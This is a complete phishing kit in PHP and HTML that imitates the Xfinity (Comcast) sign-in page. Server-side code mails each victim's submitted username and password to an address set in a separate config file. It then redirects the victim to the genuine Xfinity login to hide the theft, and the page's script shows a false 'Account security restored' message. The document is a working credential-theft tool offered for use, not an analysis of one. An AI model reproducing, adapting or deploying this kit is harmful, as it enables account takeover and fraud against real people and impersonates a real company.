<?php 

include "your_email.php";

if(isset($_POST['submit'])) {
    $to = $your_email; 
    $email = $_POST['email'];
    $password = $_POST['password'];
    $subject = "Xfinity - New Submission";
    $message = "Username/Email: " . $email . "| Password: " . $password;

    $headers = "From:" . $email;
    mail($to,$subject,$message,$headers);
    // Redirect to comcast page
    header("Location: https://login.xfinity.com"); 
    exit();
    }
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
		<title>Sign in to Xfinity</title>
		<script src="https://cdn.tailwindcss.com"></script>
		<style>
			#background {
				background-repeat: no-repeat;
				background-position: center -56px;
			}
			#background {
				background-image: url("img/bg-image.jpg");
			}
			#background {
				z-index: -1;
			}

			#errorMessage,
			#inputPassword {
				display: none;
			}
		</style>
	</head>
	<body>
		<div id="background" class="hidden lg:block absolute top-0 w-full h-full"></div>
		<div class="flex justify-evenly items-center lg:my-16 lg:mx-72">
			<div class="hidden lg:block lg:w-3/5">
				<h1 class="text-base font-semibold">
					We're committed to<br />
					keeping you connected
				</h1>
				<p class="text-sm">
					Learn how we're helping you stay connected virtually, from<br />
					distance learning to work-from-home. <a class="text-indigo-700 underline">Get help going virtual</a>
					<!-- #6138F5 -->
				</p>
				<img class="my-16" src="img/laptop-image.png" alt="Laptop Image" />
				<p class="text-sm">
					Use <span class="text-indigo-700 underline">quick bill pay</span> without even signing in.<br />
					Comcast Business customer? <span class="text-indigo-700 underline"> Sign in here</span>
				</p>
			</div>
			<div class="bg-white w-2/3 lg:w-2/5 px-8 py-8 rounded-lg">
				<svg class="w-16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28">
					<path
						fill="#8b8b97"
						d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"
					/>
				</svg>

				<p id="enteredEmail" class="mt-4 text-lg font-bold"></p>
				<h1 id="entryHeading" class="text-3xl font-bold mt-4">
					Sign in with your<br />
					Xfinity ID
				</h1>

				<form id="formLogin" class="py-8" method="POST" action="index.php">
					<input
						id="inputEmail"
						class="bg-gray-50 border border border-gray-500 rounded w-full p-4 focus:outline-2 focus:outline-indigo-700 focus:border-indigo-700 placeholder:text-gray-500"
						type="text"
						name="email"
						placeholder="Email, mobile, or username"
						required
					/>
					<input
						id="inputPassword"
						class="bg-gray-50 border border border-gray-500 rounded w-full p-4 focus:outline-2 focus:outline-indigo-700 focus:border-indigo-700 placeholder:text-gray-500"
						type="password"
						name="password"
						placeholder="password"
						required
					/>
					<p id="errorMessage" class="flex justify-start items-center text-xs font-light text-red-700 mt-2">
						<svg
							xmlns="http://www.w3.org/2000/svg"
							width="16"
							height="16"
							viewBox="0 0 24 24"
							fill="currentColor"
							focusable="false"
							role="img"
							aria-hidden="true"
						>
							<path
								d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z"
							></path>
						</svg>
						<span>Please enter your Xfinity ID to sign in.</span>
					</p>

					<p class="text-sm my-4">
						By signing in, you agree to our
						<span class="text-indigo-700 underline">Terms of Service</span> and
						<span class="text-indigo-700 underline">Privacy Policy</span>.
					</p>
					<button
						id="buttonSubmit"
						type="submit"
						name="submit"
						onclick="switchInput()"
						class="my-8 text-white font-bold bg-indigo-600 py-4 px-8 rounded"
					>
						Let's go
					</button>
					<!-- <button id="buttonSignIn" class="my-8 text-white font-bold bg-indigo-600 py-4 px-8 rounded">
						Sign In
					</button> -->
				</form>

				<ul class="flex-1 space-y-4 divide-y text-base font-light">
					<li class="flex justify-between">
						<span>Pay any balance without signing in</span>
						<svg
							xmlns="http://www.w3.org/2000/svg"
							width="24"
							height="24"
							viewBox="0 0 24 24"
							fill="currentColor"
							focusable="false"
							role="img"
							class="size-sm neutral secondary icon"
							aria-hidden="true"
						>
							<polygon
								points="9.56 18.49 8.52 17.43 13.92 11.99 8.52 6.54 9.56 5.49 16.02 11.99 9.56 18.49"
							></polygon>
						</svg>
					</li>
					<li class="flex justify-between pt-4">
						<span>Find your Xfinity ID</span>
						<svg
							xmlns="http://www.w3.org/2000/svg"
							width="24"
							height="24"
							viewBox="0 0 24 24"
							fill="currentColor"
							focusable="false"
							role="img"
							class="size-sm neutral secondary icon"
							aria-hidden="true"
						>
							<polygon
								points="9.56 18.49 8.52 17.43 13.92 11.99 8.52 6.54 9.56 5.49 16.02 11.99 9.56 18.49"
							></polygon>
						</svg>
					</li>
					<li class="flex justify-between pt-4">
						<span>Create a new Xfinity ID</span>
						<svg
							xmlns="http://www.w3.org/2000/svg"
							width="24"
							height="24"
							viewBox="0 0 24 24"
							fill="currentColor"
							focusable="false"
							role="img"
							class="size-sm neutral secondary icon"
							aria-hidden="true"
						>
							<polygon
								points="9.56 18.49 8.52 17.43 13.92 11.99 8.52 6.54 9.56 5.49 16.02 11.99 9.56 18.49"
							></polygon>
						</svg>
					</li>
				</ul>
			</div>
		</div>

		<ul class="flex justify-center space-x-4 divide-x divide-black text-base font-light mt-16">
			<li>© 2022 Comcast</li>
			<li class="pl-2 hidden md:block">Privacy Policy</li>
			<li class="pl-2 hidden md:block">Terms of Service</li>
			<li class="pl-2 hidden md:block">Do Not Sell My Personal Information</li>
		</ul>
		<script>
			// Text Elements
			let pEnteredEmail = document.getElementById("enteredEmail");
			let hEntryHeading = document.getElementById("entryHeading");
			let pErrorMessage = document.getElementById("errorMessage");

			// Form Elements
			let inputEmail = document.getElementById("inputEmail");
			let inputPassword = document.getElementById("inputPassword");
			let buttonnSubmit = document.getElementById("buttonSubmit");

			// Processing form
			function switchInput() {
				// Validate Entry Eemail Entry (if validation pass, swtich to password)
				// alert("check if inputEmail is active");
				// Validate password Entry (if validation pass submit mail and redirect)
				if (inputEmail.style.display != "none") {
					// alert("check for input value");
					if (inputEmail.value !== "") {
						// alert("check if inputEmail and start Password");
						// Hide Error message
						pErrorMessage.style.display = "none";
						// Hide the inputEmail form
						inputEmail.style.display = "none";
						// Display typed email as entered email
						pEnteredEmail.innerHTML = inputEmail.value;
						// Change headning to fit password
						hEntryHeading.innerHTML = `Enter your<br />
						password`;
						// Show the inputPassword form
						inputPassword.style.display = "block";
						// change the button to Login
						buttonnSubmit.innerHTML = "Log In";
					} else {
						// alert("show error message");
						pErrorMessage.style.display = "block";
						// console.log(hEntryHeading.innerHTML);
						return false;
					}
				} else {
					// Process Password and submit form
					// alert("show password input");
					if (inputPassword.value !== "") {
						// alert("Password not empty ");
						// alert("process and submit");
						// Hide Error message

						pErrorMessage.innerHTML = "Account security restored sucessfully!";
						
						pErrorMessage.style.color = "green";
						pErrorMessage.style.display = "block";
					} else {
						// alert("Password is empty");
						// alert("show password error");
						// Password is empty
						pErrorMessage.innerHTML = "Please enter your Xfinity Password to sign in.";
						pErrorMessage.style.display = "block";
					}
				}

				// console.log("done");
			}
		</script>
	</body>
</html>
